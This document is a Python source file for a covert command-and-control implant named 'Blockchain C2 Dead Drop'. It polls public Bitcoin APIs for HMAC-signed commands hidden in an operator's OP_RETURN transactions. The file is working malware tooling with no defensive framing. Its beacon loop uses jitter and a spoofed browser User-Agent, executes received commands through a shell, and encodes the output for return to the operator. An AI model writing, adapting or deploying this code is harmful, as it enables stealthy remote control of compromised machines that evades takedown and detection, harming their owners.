#!/usr/bin/env python3
"""Blockchain C2 Dead Drop — Uses Bitcoin OP_RETURN for command distribution.
Commands embedded in blockchain transactions, decentralized and censorship-resistant.
Alternate mode: Ethereum event logs for bidirectional C2."""
import base64
import hashlib
import hmac
import json
import os
import struct
import time
import urllib.request

class BlockchainC2:
    """C2 channel using blockchain transactions as dead drops."""

    # Public blockchain APIs (no auth needed)
    BTC_APIS = {
        'blockstream': 'https://blockstream.info/api',
        'mempool': 'https://mempool.space/api',
    }

    ETH_APIS = {
        'etherscan': 'https://api.etherscan.io/api',
    }

    def __init__(self, operator_address, hmac_key=None, chain='btc', api='blockstream'):
        self.operator_address = operator_address
        self.hmac_key = hmac_key or os.urandom(32)
        self.chain = chain
        self.api_base = self.BTC_APIS.get(api, api)
        self.session_id = os.urandom(4).hex()
        self.last_seen_txid = None
        self.seq = 0

    def _sign(self, data):
        return hmac.new(self.hmac_key, data, hashlib.sha256).hexdigest()[:16]

    def _api_get(self, endpoint):
        """Make API request."""
        url = f'{self.api_base}{endpoint}'
        req = urllib.request.Request(url, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        })
        try:
            resp = urllib.request.urlopen(req, timeout=15)
            data = resp.read()
            try:
                return json.loads(data)
            except json.JSONDecodeError:
                return data.decode(errors='replace')
        except Exception:
            return None

    def _get_op_return_data(self, tx):
        """Extract OP_RETURN data from transaction."""
        for vout in tx.get('vout', []):
            script = vout.get('scriptpubkey', '')
            # OP_RETURN = 6a, followed by push opcode and data
            if script.startswith('6a'):
                # Remove OP_RETURN opcode and length byte(s)
                hex_data = script[2:]
                if len(hex_data) >= 2:
                    push_len = int(hex_data[:2], 16)
                    if push_len <= 0x4b:  # Direct push
                        return bytes.fromhex(hex_data[2:2+push_len*2])
                    elif push_len == 0x4c:  # OP_PUSHDATA1
                        actual_len = int(hex_data[2:4], 16)
                        return bytes.fromhex(hex_data[4:4+actual_len*2])
        return None

    def check_commands(self):
        """Scan operator's transactions for commands."""
        txs = self._api_get(f'/address/{self.operator_address}/txs')
        if not txs or not isinstance(txs, list):
            return None

        for tx in txs:
            txid = tx.get('txid', '')
            if self.last_seen_txid and txid == self.last_seen_txid:
                break

            op_data = self._get_op_return_data(tx)
            if not op_data or len(op_data) < 20:
                continue

            try:
                # Format: [4-byte marker][16-byte sig][payload]
                marker = op_data[:4]
                if marker != b'FC2D':  # FORGE C2 Dead drop marker
                    continue
                sig = op_data[4:20].hex()
                payload = op_data[20:]

                if hmac.compare_digest(self._sign(payload), sig):
                    self.last_seen_txid = txid
                    cmd = json.loads(base64.b85decode(payload))
                    return cmd
            except Exception:
                continue

        if txs:
            self.last_seen_txid = txs[0].get('txid', self.last_seen_txid)
        return None

    def _encode_result_for_tx(self, result):
        """Encode result for OP_RETURN embedding."""
        data = json.dumps(result, separators=(',', ':')).encode()
        compressed = base64.b85encode(data)
        sig = self._sign(compressed)
        # Max OP_RETURN: 80 bytes. Chunk if needed.
        payload = b'FC2R' + bytes.fromhex(sig) + compressed  # FC2R = result marker
        return payload

    def monitor_address(self, address=None, callback=None):
        """Monitor blockchain address for new transactions."""
        address = address or self.operator_address
        seen = set()

        while True:
            txs = self._api_get(f'/address/{address}/txs')
            if txs and isinstance(txs, list):
                for tx in txs:
                    txid = tx.get('txid', '')
                    if txid not in seen:
                        seen.add(txid)
                        op_data = self._get_op_return_data(tx)
                        if op_data and callback:
                            callback(txid, op_data)
            time.sleep(60)  # Check every minute

    def run_loop(self, interval=120, jitter=0.3):
        """Main C2 beacon loop."""
        import random
        while True:
            try:
                cmd = self.check_commands()
                if cmd:
                    action = cmd.get('action', '')
                    if action == 'exec':
                        import subprocess
                        try:
                            out = subprocess.check_output(
                                cmd.get('cmd', 'id'), shell=True,
                                stderr=subprocess.STDOUT, timeout=30
                            ).decode(errors='replace')
                        except Exception as e:
                            out = f'[ERROR] {e}'
                        # Result too large for OP_RETURN — use side channel
                        result = self._encode_result_for_tx({'output': out[:60]})
                        print(f'[+] Result ({len(result)}B): {result.hex()}')
                    elif action == 'exit':
                        break
            except Exception:
                pass
            sleep_time = interval * (1 + random.uniform(-jitter, jitter))
            time.sleep(max(30, sleep_time))


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Blockchain C2 Dead Drop')
    parser.add_argument('--address', required=True, help='Operator BTC address')
    parser.add_argument('--key', help='HMAC key (hex)')
    parser.add_argument('--interval', type=int, default=120)
    parser.add_argument('--api', default='blockstream', choices=['blockstream', 'mempool'])
    args = parser.parse_args()

    hmac_key = bytes.fromhex(args.key) if args.key else None
    c2 = BlockchainC2(args.address, hmac_key=hmac_key, api=args.api)
    print(f'[*] Blockchain C2 | Address: {args.address} | API: {args.api}')
    c2.run_loop(interval=args.interval)

if __name__ == '__main__':
    main()
